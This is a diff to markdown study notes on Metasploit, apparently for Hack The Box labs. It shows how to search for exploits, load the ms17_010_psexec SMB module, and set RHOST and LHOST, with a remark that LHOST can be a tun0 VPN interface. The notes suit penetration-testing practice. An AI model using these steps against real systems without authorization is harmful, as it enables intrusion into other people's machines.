@@ -32,7 +32,6 @@ tags: [technique, other]
 search exploit {exploit}
 ```
 - Gives description of the exploit and the exploit path related to it such as `exploit/windows/smb/ms17_010_psexec`
-
 #### Use an exploit
 ```bash
 use exploit/windows/smb/ms17_010_psexec
@@ -50,8 +49,9 @@ set RHOST {IP}
 
 #### Set IP of where we are attacking from
 ```
-set 
+set LHOST {IP}
 ```
+- Can also be a network interface such as `tun0`, our HTB vpn IP
 ## Tools
 - 
 
